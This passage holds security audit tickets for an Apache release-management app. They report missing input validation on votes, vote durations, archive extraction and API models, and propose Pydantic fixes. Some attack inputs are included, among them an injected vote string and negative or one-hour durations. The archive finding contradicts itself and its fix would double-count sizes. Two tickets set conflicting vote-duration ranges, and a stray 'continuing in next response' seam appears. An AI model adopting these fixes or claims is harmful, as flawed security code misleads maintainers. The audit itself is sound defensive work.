    # vote is directly interpolated into email body
    email_body = format_vote_email_body(
        vote=vote,  # No validation
        ...
    )
```

Attack example:
```
vote = "+1\n\nActually this release is terrible -1"
# Creates confusing vote record in mailing list archive
```

### Recommended Remediation
Define VALID_VOTES constant and add validation:

```python
# In atr/storage/writers/vote.py or atr/shared/voting.py
VALID_VOTES = frozenset({'+1', '0', '-1'})

def format_vote_email_body(vote: str, ...) -> str:
    """Format vote email body with validated vote value."""
    if vote not in VALID_VOTES:
        raise ValueError(f"Invalid vote value: {vote}. Must be +1, 0, or -1")
    ...
```

Add Pydantic field_validator to VoteForm:

```python
class VoteForm(form.Form):
    vote: str
    
    @pydantic.field_validator('vote')
    @classmethod
    def validate_vote(cls, v: str) -> str:
        if v not in {'+1', '0', '-1'}:
            raise ValueError("Vote must be +1, 0, or -1")
        return v
```

### Acceptance Criteria
- [ ] VALID_VOTES constant defines allowed values
- [ ] format_vote_email_body() validates vote parameter
- [ ] VoteForm.vote has field_validator
- [ ] Invalid vote values are rejected at multiple layers
- [ ] Unit tests verify validation
- [ ] Clear error message for invalid votes
- [ ] Vote emails only contain valid vote values

### References
- Source reports: L1:2.1.1.md
- Related findings: None
- ASVS sections: 2.1.1

### Priority
Medium

---

## Issue: FINDING-124 - Vote Duration Lacks Server-Side Range Enforcement

**Labels:** bug, security, priority:medium, asvs-level:L1

**ASVS Level(s):** [L1]

**Description:**

### Summary
The StartVotingForm.vote_duration field has a default value of 72 hours but no server-side validation to enforce the documented minimum voting period. The validation function _validate_min_hours() exists in the policy layer but is not called when starting a vote. Authenticated committers can initiate votes with arbitrarily short durations, circumventing ASF's minimum 72-hour voting period requirement.

### Details
In atr/shared/voting.py lines 15-20:

```python
class StartVotingForm(form.Form):
    vote_duration: int = 72  # Default but no validation
```

In atr/post/voting.py lines 35-50, the start_vote() handler does not validate vote_duration.

A _validate_min_hours() function exists in the policy layer that checks for 72-hour minimum, but it's not called in the vote initiation flow.

Attack scenario:
```
vote_duration = 1  # 1 hour vote, bypassing 72-hour requirement
# Vote could pass before community has time to review
```

### Recommended Remediation
Add a Pydantic field_validator to StartVotingForm:

```python
class StartVotingForm(form.Form):
    vote_duration: int = 72
    
    @pydantic.field_validator('vote_duration')
    @classmethod
    def validate_vote_duration(cls, v: int) -> int:
        """Validate vote duration meets ASF policy requirements."""
        # Allow 0 for testing environments
        if v == 0:
            return v
        
        # Require minimum 72 hours (3 days) per ASF policy
        if v < 72:
            raise ValueError(
                "Vote duration must be at least 72 hours per ASF policy"
            )
        
        # Set reasonable maximum (30 days)
        if v > 720:
            raise ValueError(
                "Vote duration must be at most 720 hours (30 days)"
            )
        
        return v
```

### Acceptance Criteria
- [ ] vote_duration must be 0 (testing) or 72-720 hours
- [ ] Field validator enforces range at form boundary
- [ ] Invalid durations are rejected with clear error
- [ ] Unit tests verify validation
- [ ] ASF 72-hour minimum voting period is enforced
- [ ] Existing voting functionality works

### References
- Source reports: L1:2.1.1.md
- Related findings: None
- ASVS sections: 2.1.1

### Priority
Medium

---

## Issue: FINDING-125 - Optional Safe-Type URL Parameters Bypass Validation

**Labels:** bug, security, priority:medium, asvs-level:L1

**ASVS Level(s):** [L1]

**Description:**

### Summary
The typed route system skips validation for optional safe-type parameters. When a parameter is typed as Optional[SafeType], the code adds it to optional_params and continues without adding it to validated_params, causing validate_params() to never call the safe type's validation logic. Handlers receive raw strings instead of validated SafeType instances.

### Details
In atr/blueprints/common.py lines ~145-152, the build_api_path() function:

```python
if is_optional(annotation):
    optional_params.add(param_name)
    continue  # BUG: Skips validation for optional SafeType
```

When a parameter is Optional[SafeType], this code:
1. Adds it to optional_params
2. Continues loop without adding to validated_params
3. validate_params() never validates the SafeType

Example:
```python
@get.typed
async def handler(
    project_key: safe.ProjectKey,
    version_key: Optional[safe.VersionKey]  # Bypasses validation!
):
    # version_key is raw string, not validated VersionKey
```

### Recommended Remediation
Modify build_api_path() to still add optional SafeType parameters to validated_params:

```python
if is_optional(annotation):
    optional_params.add(param_name)
    # Don't continue - still add to validated_params if it's a SafeType
    inner_type = get_args(annotation)[0]
    if is_safe_type(inner_type):
        validated_params[param_name] = inner_type
        continue

# Check for SafeType
if is_safe_type(annotation):
    validated_params[param_name] = annotation
```

Update validate_params() to skip None values but still validate present optional parameters:

```python
def validate_params(params: dict, validated_params: dict) -> dict:
    """Validate parameters using safe types."""
    result = {}
    for name, safe_type in validated_params.items():
        value = params.get(name)
        if value is None:
            result[name] = None  # Allow None for optional params
        else:
            result[name] = safe_type(value)  # Validate if present
    return result
```

### Acceptance Criteria
- [ ] Optional safe-type parameters are validated when present
- [ ] None values for optional parameters are allowed
- [ ] Present optional parameters are validated with SafeType
- [ ] Handlers receive SafeType instances, not raw strings
- [ ] Unit tests verify optional parameter validation
- [ ] Existing routing functionality works

### References
- Source reports: L1:2.2.1.md
- Related findings: None
- ASVS sections: 2.2.1

### Priority
Medium

---

## Issue: FINDING-126 - API Policy Update Bypasses Form-Level Business Validation

**Labels:** bug, security, priority:medium, asvs-level:L1

**ASVS Level(s):** [L1]

**Description:**

### Summary
The PolicyUpdateArgs Pydantic model used by the API endpoint lacks business validation rules that are present in the corresponding web form models. Missing validations include: min_hours range (72-144 or 0), github_repository_name slash rejection, workflow path prefix checks, and mailto_addresses email format validation. This creates inconsistency where API users bypass validation that web form users receive.

### Details
In atr/models/api.py lines ~180-220, PolicyUpdateArgs defines fields without business validation:

```python
class PolicyUpdateArgs(pydantic.BaseModel):
    min_hours: int  # No range validation
    github_repository_name: str  # No slash validation
    workflow_path: str  # No prefix validation
    mailto_addresses: list[str]  # No email format validation
```

The corresponding web forms in atr/shared/projects.py have validators for:
- min_hours: Must be 72-144 or 0
- github_repository_name: Must not contain slashes beyond 'org/repo'
- workflow_path: Must start with '.github/workflows/'
- mailto_addresses: Each must be valid email format

### Recommended Remediation
Add a Pydantic model_validator to PolicyUpdateArgs:

```python
class PolicyUpdateArgs(pydantic.BaseModel):
    min_hours: int
    github_repository_name: str | None
    workflow_path: str | None
    mailto_addresses: list[str]
    
    @pydantic.model_validator(mode='after')
    def validate_policy_update(self) -> 'PolicyUpdateArgs':
        """Validate policy update arguments match web form rules."""
        
        # Validate min_hours range
        if self.min_hours != 0 and not (72 <= self.min_hours <= 144):
            raise ValueError("min_hours must be 0 or between 72-144")
        
        # Validate GitHub repository name
        if self.github_repository_name:
            parts = self.github_repository_name.split('/')
            if len(parts) != 2:
                raise ValueError(
                    "github_repository_name must be 'org/repo' format"
                )
        
        # Validate workflow path prefix
        if self.workflow_path:
            if not self.workflow_path.startswith('.github/workflows/'):
                raise ValueError(
                    "workflow_path must start with '.github/workflows/'"
                )
        
        # Validate email addresses
        email_pattern = re.compile(r'^[^@]+@[^@]+\.[^@]+$')
        for email in self.mailto_addresses:
            if not email_pattern.match(email):
                raise ValueError(f"Invalid email address: {email}")
        
        return self
```

### Acceptance Criteria
- [ ] min_hours range is validated (0 or 72-144)
- [ ] github_repository_name format is validated
- [ ] workflow_path prefix is validated
- [ ] mailto_addresses are validated for email format
- [ ] API and web form validation are consistent
- [ ] Unit tests verify all validation rules
- [ ] Clear error messages for invalid input

### References
- Source reports: L1:2.2.1.md
- Related findings: ASVS-221-HIGH-002, ASVS-221-HIGH-003
- ASVS sections: 2.2.1

### Priority
Medium

---

## Issue: FINDING-127 - Vote Duration Integer Lacks Range Validation

**Labels:** bug, security, priority:medium, asvs-level:L1

**ASVS Level(s):** [L1]

**Description:**

### Summary
The vote_duration field in StartVotingForm and Initiate task model accepts any integer without range validation. This allows negative values (creating votes with end times in the past, bypassing minimum voting period) or extremely large values (effectively blocking the release process indefinitely for 114+ years).

### Details
In atr/shared/voting.py lines ~45-50:

```python
class StartVotingForm(form.Form):
    vote_duration: int = 72  # No validation
```

In atr/tasks/vote.py lines ~30-45:

```python
class Initiate(pydantic.BaseModel):
    vote_duration: int  # No validation
```

Attack scenarios:
- vote_duration = -72: Vote ends 72 hours in the past, immediately "complete"
- vote_duration = 999999: Vote ends in 114 years, blocking release indefinitely

### Recommended Remediation
Add Pydantic field_validator to both StartVotingForm and Initiate models:

```python
class StartVotingForm(form.Form):
    vote_duration: int = 72
    
    @pydantic.field_validator('vote_duration')
    @classmethod
    def validate_duration(cls, v: int) -> int:
        if v < 72:
            raise ValueError("Vote duration must be at least 72 hours")
        if v > 336:  # 14 days
            raise ValueError("Vote duration must be at most 336 hours")
        return v

class Initiate(pydantic.BaseModel):
    vote_duration: int
    
    @pydantic.field_validator('vote_duration')
    @classmethod
    def validate_duration(cls, v: int) -> int:
        if v < 72:
            raise ValueError("Vote duration must be at least 72 hours")
        if v > 336:
            raise ValueError("Vote duration must be at most 336 hours")
        return v
```

### Acceptance Criteria
- [ ] vote_duration minimum is 72 hours
- [ ] vote_duration maximum is 336 hours (14 days)
- [ ] Negative durations are rejected
- [ ] Extremely large durations are rejected
- [ ] Validation is applied at both form and task model
- [ ] Unit tests verify range validation
- [ ] Clear error messages for invalid durations

### References
- Source reports: L1:2.2.1.md
- Related findings: ASVS-221-HIGH-003
- ASVS sections: 2.2.1

### Priority
Medium

---

## Issue: FINDING-128 - Archive Extraction Size Limit Bypassed via Metadata File Interleaving

**Labels:** bug, security, priority:medium, asvs-level:L1

**ASVS Level(s):** [L1]

**Description:**

### Summary
The archive extraction functions return 0 for extracted size when skipping macOS metadata files (._* prefix) or device files, instead of returning the accumulated total_extracted value. This resets the size accumulator, allowing archives to exceed the configured max_size limit by interleaving skipped files between regular files. Test confirmed 270MB extracted with 100MB limit.

### Details
In atr/archives.py lines ~180-220 and ~250-290:

```python
# In _tar_archive_extract_member()
if member_name.startswith('._'):
    return 0, extracted_paths  # BUG: Resets accumulator

# In _zip_archive_extract_member()
if member.filename.startswith('._'):
    return 0, extracted_paths  # BUG: Resets accumulator
```

The calling code accumulates extracted size:
```python
total_extracted = 0
for member in archive:
    extracted_size, paths = extract_member(member, ...)
    total_extracted += extracted_size  # Resets when extracted_size == 0
    if total_extracted > max_size:
        raise ExtractionError("Size limit exceeded")
```

Attack:
```
file1.bin (90MB) -> total = 90MB
._metadata (skipped) -> returns 0, total = 90MB (no increment)
file2.bin (90MB) -> total = 180MB
._metadata (skipped) -> returns 0, total = 180MB
file3.bin (90MB) -> total = 270MB
Total: 270MB extracted with 100MB limit
```

### Recommended Remediation
Change early returns to preserve the accumulator:

```python
# In _tar_archive_extract_member()
if member_name.startswith('._'):
    log.info(f"Skipping macOS metadata file: {member_name}")
    return total_extracted, extracted_paths  # FIX: Preserve accumulator

# In _zip_archive_extract_member()
if member.filename.startswith('._'):
    log.info(f"Skipping macOS metadata file: {member.filename}")
    return total_extracted, extracted_paths  # FIX: Preserve accumulator
```

### Acceptance Criteria
- [ ] Size limit is enforced across all members
- [ ] Skipped files do not reset the accumulator
- [ ] Interleaving metadata files cannot bypass limit
- [ ] Unit tests verify limit with interleaved metadata
- [ ] Integration tests verify realistic attack scenarios
- [ ] Existing extraction functionality works correctly

### References
- Source reports: L1:2.2.1.md
- Related findings: None
- ASVS sections: 2.2.1

### Priority
Medium

---

(Continuing with remaining issues in next response due to length...)

---

## Issue: FINDING-151 - Distribution Delete Allows Removal from Any Release Phase

**Labels:** bug, security, priority:medium, asvs-level:L1

**ASVS Level(s):** L1

**Description:**

### Summary
The distribution delete operation allows committee members to remove distribution records from releases in any phase, including RELEASE (announced). The route handler in `atr/post/distribution.py` fetches releases without phase validation, and the storage layer method `delete_distribution()` lacks phase checks. Distribution records track where and how releases are published; deleting them from announced releases could disrupt published distribution information and violate release immutability principles.

### Details
The delete() route handler (lines 85-118 in `atr/post/distribution.py`) and storage layer method `delete_distribution()` (lines 228-243 in `atr/storage/writers/distributions.py`) do not validate the release phase before allowing deletion. This means distributions can be removed from RELEASE phase releases where metadata should be immutable.

### Recommended Remediation
Add phase validation in the delete() route handler to prevent deletion of distributions from RELEASE phase releases. Check `release.phase == sql.ReleasePhase.RELEASE` and return an error if attempting to delete distributions from announced releases. Consider adding the same check in the storage layer for defense in depth.

```python
if release.phase == sql.ReleasePhase.RELEASE:
    raise exceptions.BadRequest("Cannot delete distributions from announced releases")
```

### Acceptance Criteria
- [ ] Distribution deletion is blocked for releases in RELEASE phase
- [ ] Appropriate error message is returned when attempting to delete from RELEASE phase
- [ ] Unit test verifying the fix

### References
- Source reports: L1:2.3.1.md
- ASVS sections: 2.3.1

### Priority
Medium

---

## Issue: FINDING-152 - Revision Number Not Validated Against Release Context

**Labels:** bug, security, priority:medium, asvs-level:L2

**ASVS Level(s):** L2-only

**Description:**

### Summary
The `selected_revision` endpoint accepts a revision number from the URL path but never validates that the revision actually belongs to the specified release. This violates the contextual consistency principle that `(project_key, version_key, revision_number)` should be validated as a unit. An authenticated committer can query task counts for arbitrary revision numbers, potentially accessing information about revisions they shouldn't have access to.

### Details
In `atr/get/checks.py` (lines 107-162), the endpoint accepts revision_number from the URL but does not verify it belongs to the release identified by project_key and version_key. This allows querying information about revisions from other releases.

### Recommended Remediation
Add validation to verify that the revision belongs to the specified release by querying `data.revision(release_key=release.key, number=str(revision_number))` and demanding its existence before proceeding with task operations.

```python
revision = await data.revision(release_key=release.key, number=str(revision_number)).demand(
    exceptions.NotFound(f"Revision {revision_number} not found for this release")
)
```

### Acceptance Criteria
- [ ] Revision number is validated against the release context
- [ ] Attempting to access a revision from a different release returns 404
- [ ] Unit test verifying the fix

### References
- Source reports: L2:2.1.2.md
- Related findings: ASVS-212-MED-004
- ASVS sections: 2.1.2

### Priority
Medium

---

## Issue: FINDING-153 - Documentation Missing Cross-Entity Business Logic Validation Rules

**Labels:** bug, security, priority:medium, asvs-level:L2

**ASVS Level(s):** L2-only

**Description:**

### Summary
The `input-validation.md` documentation defines data integrity validation rules in `validate.py`, but does not document significant cross-entity contextual validation rules implemented in `atr/db/interaction.py` and other modules. ASVS 2.1.2 explicitly requires documentation to define how logical and contextual consistency is validated. Undocumented rules include vote readiness cross-checks, trusted publishing phase matching, email recipient domain validation, and repository/workflow validation.

### Details
Critical business logic validation exists in multiple locations (lines 220-260, 310-340, 410-440 in `atr/db/interaction.py` and lines 115-125 in `atr/mail.py`) but is not documented in the input validation documentation. This creates a gap where auditors and maintainers cannot understand the complete validation landscape.

### Recommended Remediation
Add a 'Business Logic Validation' section to `input-validation.md` documenting:
1. Vote initiation requirements in `release_ready_for_vote`
2. Trusted publishing validation rules in `trusted_jwt_for_dist` and `_trusted_project`
3. Email recipient domain validation in `_validate_recipient`
4. A comprehensive table of contextual consistency examples with enforcement locations

### Acceptance Criteria
- [ ] New section added to input-validation.md covering business logic validation
- [ ] All cross-entity validation rules are documented
- [ ] Table of contextual consistency checks with implementation references
- [ ] Documentation reviewed and approved

### References
- Source reports: L2:2.1.2.md
- Related findings: ASVS-212-LOW-002, ASVS-212-LOW-003
- ASVS sections: 2.1.2

### Priority
Medium

---

## Issue: FINDING-154 - API Models Lack Cross-Field Contextual Validation

**Labels:** bug, security, priority:medium, asvs-level:L2

**ASVS Level(s):** L2-only

**Description:**

### Summary
Several API argument models accept related fields but perform no cross-field validation at the model level. This forces callers to rely on undocumented downstream logic to catch inconsistent combined inputs. Examples include VoteStartArgs (email_to not validated against project, vote_duration not validated against policy, revision not validated against release) and DistributionRecordArgs (distribution_owner_namespace not validated per platform, no relationship validation between fields).

### Details
In `atr/models/api.py` (lines 100-400), multiple API models accept related parameters without validating their relationships, creating opportunities for invalid state combinations to pass initial validation and fail later in processing.

### Recommended Remediation
Add Pydantic `@model_validator` decorators to API models to enforce cross-field rules:

```python
@pydantic.model_validator(mode="after")
def validate_vote_args(self) -> "VoteStartArgs":
    if self.vote_duration <= 0:
        raise ValueError("Vote duration must be positive")
    # Additional validations
    return self
```

For DistributionRecordArgs, validate distribution_owner_namespace requirements based on platform. Add comprehensive API documentation describing cross-field validation rules.

### Acceptance Criteria
- [ ] Cross-field validators added to VoteStartArgs
- [ ] Cross-field validators added to DistributionRecordArgs
- [ ] API documentation updated with validation rules
- [ ] Unit tests verifying cross-field validation

### References
- Source reports: L2:2.1.2.md
- Related findings: ASVS-212-MED-002
- ASVS sections: 2.1.2

### Priority
Medium

---

## Issue: FINDING-155 - Inconsistent Phase Validation Between Related Endpoints

**Labels:** bug, security, priority:medium, asvs-level:L2

**ASVS Level(s):** L2-only

**Description:**

### Summary
The `selected` and `selected_revision` endpoints handle related operations (viewing checks for a release), but enforce phase validation inconsistently. The parent endpoint `selected` restricts to `RELEASE_CANDIDATE` phase, while the child endpoint `selected_revision` accepts releases in any phase. This allows users to view revision-specific checks for releases that shouldn't be in checking phase, creating a workflow bypass.

### Details
In `atr/get/checks.py`, the `selected` endpoint (line 91) enforces phase restrictions while `selected_revision` (line 107) does not, creating inconsistent behavior for related operations.

### Recommended Remediation
Either enforce the same phase restriction in `selected_revision` by adding `phase=sql.ReleasePhase.RELEASE_CANDIDATE` parameter to the release query, or explicitly validate the phase and document which phases are allowed for revision-specific operations. Add documentation table showing operation-to-phase mappings.

### Acceptance Criteria
- [ ] Consistent phase validation across both endpoints
- [ ] Documentation added explaining phase restrictions
- [ ] Unit tests verifying phase enforcement

### References
- Source reports: L2:2.1.2.md
- Related findings: ASVS-212-MED-001
- ASVS sections: 2.1.2

### Priority
Medium

---

## Issue: FINDING-156 - Rate Limiting Rules Not Documented

**Labels:** bug, security, priority:medium, asvs-level:L2

**ASVS Level(s):** L2-only

**Description:**

### Summary
The application implements comprehensive rate limiting via the quart_rate_limiter library but does not document the specific limits, enforcement mechanisms, or rationale in either input-validation.md or storage-interface.md. Global API rate limit of 500/hr and sensitive endpoint limits of 10/hr are enforced but undocumented.

### Details
Rate limiting is configured in `atr/blueprints/api.py` (lines 45-50) and applied throughout `atr/api/__init__.py`, but no documentation exists explaining the limits, why they were chosen, or how they're enforced.

### Recommended Remediation
Add rate limiting documentation to input-validation.md with sections covering:
- Global API Limits (500 req/hr per client IP)
- Sensitive Endpoint Limits (10 req/hr for JWT creation, key operations, SSH registration)
- Enforcement mechanism (quart_rate_limiter middleware)
- Security rationale (prevent API abuse and DoS attacks)

### Acceptance Criteria
- [ ] Rate limiting section added to input-validation.md
- [ ] All rate limits documented with values and rationale
- [ ] Enforcement mechanism explained
- [ ] Documentation reviewed and approved

### References
- Source reports: L2:2.1.3.md
- ASVS sections: 2.1.3

### Priority
Medium

---

## Issue: FINDING-157 - Archive Extraction Security Limits Not Documented

**Labels:** bug, security, priority:medium, asvs-level:L2

**ASVS Level(s):** L2-only

**Description:**

### Summary
The application implements multiple layers of archive security controls to prevent zip bombs, decompression attacks, and resource exhaustion, but these critical security limits are scattered across three files without centralized documentation. Limits include MAX_ARCHIVE_MEMBERS (100K), compression ratio (100:1), path depth (32), max upload (512MB), max extract (2GB), and license file size (1MB).

### Details
Security limits are defined in `atr/tarzip.py` (line 15), `atr/tasks/quarantine.py` (lines 89-98), and `atr/config.py` (lines 34-35) without any centralized documentation explaining their purpose or the attack scenarios they prevent.

### Recommended Remediation
Add comprehensive archive extraction security limits section to input-validation.md documenting all limits with their values, purposes, and attack scenarios prevented (zip bombs, member bombs, nesting bombs). Include table of limits with rationale and implementation references.

### Acceptance Criteria
- [ ] Archive security section added to input-validation.md
- [ ] All limits documented with values and attack scenarios
- [ ] Table of limits with implementation locations
- [ ] Documentation reviewed and approved

### References
- Source reports: L2:2.1.3.md
- ASVS sections: 2.1.3

### Priority
Medium

---

## Issue: FINDING-158 - Voting Business Rules Not Documented

**Labels:** bug, security, priority:medium, asvs-level:L2

**ASVS Level(s):** L2-only

**Description:**

### Summary
The application enforces critical ASF governance rules for release voting, but these business rules exist only in code without formal documentation. Rules include voting period constraints (72-144 hours or 0 for disabled), podling restrictions (manual voting prohibited), and email domain requirements (@apache.org only).

### Details
Voting rules are enforced in `atr/storage/writers/policy.py` (lines 297-300, 173-175) and `atr/tasks/vote.py`, but no documentation exists explaining these governance requirements or their rationale.

### Recommended Remediation
Create docs/voting-rules.md documenting:
- Voting period requirements (72-144hr minimum/maximum per ASF policy)
- Podling restrictions with rationale
- Email domain requirements
- Vote state consistency rules
- Vote resolution requirements
- ASF policy references

### Acceptance Criteria
- [ ] New voting-rules.md document created
- [ ] All voting business rules documented
- [ ] ASF policy references included
- [ ] Documentation reviewed and approved

### References
- Source reports: L2:2.1.3.md
- ASVS sections: 2.1.3

### Priority
Medium

---

## Issue: FINDING-159 - Session Lifecycle Limits Not Documented

**Labels:** bug, security, priority:medium, asvs-level:L2

**ASVS Level(s):** L2-only

**Description:**

### Summary
The application implements two distinct session timeout mechanisms (7-day idle timeout and 72-hour absolute lifetime) along with multiple authentication methods, but these are not documented in either input-validation.md or storage-interface.md. Cookie security attributes and account ban checking are also undocumented.

### Details
Session management is implemented in `src/asfquart/session.py` (lines 40-65) with configuration in `atr/config.py` (line 52), but no documentation exists explaining the dual timeout mechanism, authentication methods, or security attributes.

### Recommended Remediation
Add session management limits section to input-validation.md documenting:
- Dual timeout mechanism (7-day idle, 72-hour absolute)
- Authentication methods (session cookie, PATs, basic auth)
- Cookie security attributes (__Host-session prefix, Secure, HttpOnly, SameSite=Strict)
- Real-time LDAP ban checking

### Acceptance Criteria
- [ ] Session management section added to input-validation.md
- [ ] All timeout mechanisms documented
- [ ] Authentication methods explained
- [ ] Cookie security attributes listed
- [ ] Documentation reviewed and approved

### References
- Source reports: L2:2.1.3.md
- ASVS sections: 2.1.3

### Priority
Medium

---

## Issue: FINDING-160 - Trusted Publishing Validation Rules Not Documented

**Labels:** bug, security, priority:medium, asvs-level:L2

**ASVS Level(s):** L2-only

**Description:**

### Summary
The application implements complex trusted publishing validation logic for GitHub Actions integration, including repository naming rules (must start with 'apache/'), workflow path restrictions (must start with '.github/workflows/'), identity mapping (GitHub actor_id to Apache UID via LDAP), and SSH key TTL (20 minutes). This critical trust boundary lacks centralized documentation.

### Details
Trusted publishing validation is implemented in `atr/db/interaction.py` (lines 448-475), `atr/storage/writers/policy.py` (lines 241-277), and `atr/storage/writers/ssh.py` (line 82), but no documentation explains these security controls.

### Recommended Remediation
Create docs/trusted-publishing.md documenting:
- Repository validation rules (apache/ prefix requirement)
- Workflow validation rules (.github/workflows/ prefix)
- Identity mapping process (GitHub actor_id to Apache UID via LDAP github_id attribute)
- SSH key lifecycle (20-minute TTL)
- Phase-based authorization restrictions

### Acceptance Criteria
- [ ] New trusted-publishing.md document created
- [ ] All validation rules documented
- [ ] Identity mapping process explained
- [ ] SSH key lifecycle documented
- [ ] Documentation reviewed and approved

### References
- Source reports: L2:2.1.3.md
- ASVS sections: 2.1.3

### Priority
Medium

---

## Issue: FINDING-161 - Distribution Retry Logic Not Documented

**Labels:** bug, security, priority:medium, asvs-level:L2

**ASVS Level(s):** L2-only

**Description:**

### Summary
The application implements a retry mechanism for distribution recording that silently deletes distributions after 5 failed attempts without user notification. This behavior is not documented and provides no user awareness of data loss. Distribution records are permanently removed after retry exhaustion with only error log entries.

### Details
In `atr/tasks/distribution.py` (lines 35-45), distributions are automatically deleted after 5 retry attempts fail, but users are not notified of this data loss.

### Recommended Remediation
Document retry policy in business logic limits documentation: maximum 5 retry attempts, automatic deletion after exhaustion, logging behavior. Consider implementing user notification when distributions are deleted after retry failure to alert release managers. Add email notification to inform users of failed distribution recording.

### Acceptance Criteria
- [ ] Retry policy documented in business logic documentation
- [ ] User notification mechanism implemented
- [ ] Email alerts sent when distributions are deleted
- [ ] Unit tests verifying notification delivery

### References
- Source reports: L2:2.1.3.md
- ASVS sections: 2.1.3

### Priority
Medium

---

## Issue: FINDING-162 - Broken Cross-Field Validation in Vote Lifecycle Logic

**Labels:** bug, security, priority:medium, asvs-level:L2

**ASVS Level(s):** L2-only

**Description:**

### Summary
The `release_vote_logic` function contains a match statement designed to validate that vote lifecycle combinations are valid. However, a wildcard pattern `(_, _)` catches ALL 2-tuples before the intended invalid case can be detected. The nested `okay()` function receives `(vote_started, vote_resolved)` tuple and should reject `(None, datetime)` — resolved without started — but the wildcard pattern matches this invalid state and returns `True`. This causes invalid vote states to pass validation.

### Details
In `atr/validate.py` (lines 250-265), the match statement has incorrect pattern ordering that allows invalid vote states (resolved without started) to pass validation.

### Recommended Remediation
Reorder match statement cases to handle invalid case before wildcard:

```python
def okay(sr: tuple[datetime.datetime | None, datetime.datetime | None]) -> bool:
    match sr:
        case (None, None) | (_, None):
            return True
        case (None, _):  # vote_resolved set without vote_started — invalid
            return False
        case (_, _):
            return True
    return False
```

### Acceptance Criteria
- [ ] Match statement pattern order corrected
- [ ] Invalid vote states (resolved without started) are rejected
- [ ] Unit tests verifying rejection of invalid states

### References
- Source reports: L2:2.2.3.md
- ASVS sections: 2.2.3

### Priority
Medium

---

## Issue: FINDING-163 - Form Hidden Field Validated Against Wrong Source

**Labels:** bug, security, priority:medium, asvs-level:L2

**ASVS Level(s):** L2-only

**Description:**

### Summary
The `AddProjectForm` validates the `committee_key` field against itself (from a user-controllable hidden field) rather than cross-validating against the URL parameter used for authorization. User authorized for committee 'infra' via URL can modify hidden field to 'security' before submission. Form validator checks project label starts with 'security-' (passes) but handler creates project under 'infra' committee with 'security-' prefix, bypassing naming conventions.

### Details
In `atr/shared/projects.py` (lines 31-73) and `atr/post/projects.py` (lines 27-42), the form validates against its own hidden field instead of the URL parameter used for authorization.

### Recommended Remediation
Pass the URL parameter into Pydantic validation context or verify consistency in handler before proceeding:

```python
async def add_project(session, committee_key, project_form):
    if project_form.committee_key != str(committee_key):
        raise exceptions.BadRequest("Committee key mismatch")
    # ... proceed
```

### Acceptance Criteria
- [ ] Committee key cross-validation implemented
- [ ] Mismatch between URL and form field is rejected
- [ ] Unit tests verifying validation

### References
- Source reports: L2:2.2.3.md
- Related findings: ASVS-223-MED-004
- ASVS sections: 2.2.3

### Priority
Medium

---

## Issue: FINDING-164 - API Distribution Models Missing Platform/Owner-Namespace Validation

**Labels:** bug, security, priority:medium, asvs-level:L2

**ASVS Level(s):** L2-only

**Description:**

### Summary
Three API distribution models lack cross-field validation for platform/owner-namespace consistency that exists in the corresponding web form. API clients can submit distribution records with inconsistent platform/owner_namespace combinations (e.g., PyPI with namespace, Maven without) that would be rejected in web forms. No validation that `platform` and `owner_namespace` are consistent.

### Details
In `atr/models/api.py`, three models (DistributionRecordArgs line 110, DistributionRecordFromWorkflowArgs line 136, PublisherDistributionRecordArgs line 261) lack platform/owner-namespace validation present in web forms.

### Recommended Remediation
Add the same validation to all three API models:

```python
@pydantic.model_validator(mode="after")
def validate_owner_namespace(self) -> "DistributionRecordArgs":
    requires_owner_namespace = self.platform.value.requires_owner_namespace
    if requires_owner_namespace and not self.distribution_owner_namespace:
        raise ValueError(f'Platform "{self.platform.value.name}" requires an owner or namespace.')
    if not requires_owner_namespace and self.distribution_owner_namespace:
        raise ValueError(f'Platform "{self.platform.value.name}" does not use owner/namespace.')
    return self
```

### Acceptance Criteria
- [ ] Validation added to DistributionRecordArgs
- [ ] Validation added to DistributionRecordFromWorkflowArgs
- [ ] Validation added to PublisherDistributionRecordArgs
- [ ] Unit tests verifying validation for all three models

### References
- Source reports: L2:2.2.3.md
- ASVS sections: 2.2.3

### Priority
Medium

---

## Issue: FINDING-165 - URL Parameter Not Cross-Validated With Form Project Key

**Labels:** bug, security, priority:medium, asvs-level:L2

**ASVS Level(s):** L2-only

**Description:**

### Summary
The `EditProjectForm` contains a hidden `project_key` field that is not cross-validated against the URL parameter used for authorization and data retrieval. While the handler correctly uses the URL parameter for authorization and data access, the lack of cross-validation creates potential for confusion if form validators or downstream code reference the form's `project_key` field, assuming it matches the authorized context.

### Details
In `atr/shared/projects.py` (lines 75-119) and `atr/post/projects.py` (lines 45-65), the form's project_key hidden field is not validated against the URL parameter.

### Recommended Remediation
Add cross-validation in the form or handler:

```python
async def edit_project(session, committee_key, project_key, project_form):
    if project_form.project_key != str(project_key):
        raise exceptions.BadRequest("Project key mismatch")
    # ... proceed
```

### Acceptance Criteria
- [ ] Project key cross-validation implemented
- [ ] Mismatch between URL and form field is rejected
- [ ] Unit tests verifying validation

### References
- Source reports: L2:2.2.3.md
- Related findings: ASVS-223-MED-002
- ASVS sections: 2.2.3

### Priority
Medium

---

## Issue: FINDING-166 - Pagination Offset Validation Never Executes Due to Typo

**Labels:** bug, security, priority:medium, asvs-level:L2

**ASVS Level(s):** L2-only

**Description:**

### Summary
A typo in the attribute name check (`"offest"` instead of `"offset"`) causes the pagination offset validation to never execute, allowing unbounded offset values. This affects unauthenticated endpoints `/api/releases/list` and `/api/tasks/list` with no rate limiting, enabling Denial of Service via unbounded offset values forcing SQLite to scan millions/billions of rows.

### Details
In `atr/api/__init__.py` (line 28), the check for `hasattr(query_args, "offest")` has a typo that prevents offset validation from executing.

### Recommended Remediation
Fix the typo and add bounds checking:

```python
if hasattr(query_args, "offset"):  # ← Fixed typo
    offset = query_args.offset
    if offset > 1000000:
        raise exceptions.BadRequest("Maximum offset of 1000000 exceeded")
    elif offset < 0:
        raise exceptions.BadRequest("Offset must be non-negative")
```

### Acceptance Criteria
- [ ] Typo corrected in attribute name check
- [ ] Offset bounds validation implemented
- [ ] Unit tests verifying bounds enforcement
- [ ] Test for typo regression

### References
- Source reports: L2:2.2.3.md
- ASVS sections: 2.2.3

### Priority
Medium

---

## Issue: FINDING-167 - Vote Duration Not Validated Against Release Policy

**Labels:** bug, security, priority:medium, asvs-level:L2

**ASVS Level(s):** L2-only

**Description:**

### Summary
When initiating a vote, the submitted `vote_duration_choice` is not validated against the project's release policy `min_hours` requirement. An authorized committee participant could initiate a vote with a 1-hour duration even if the project policy requires a minimum of 72 hours, bypassing ASF voting policy requirements and potentially invalidating the vote.

### Details
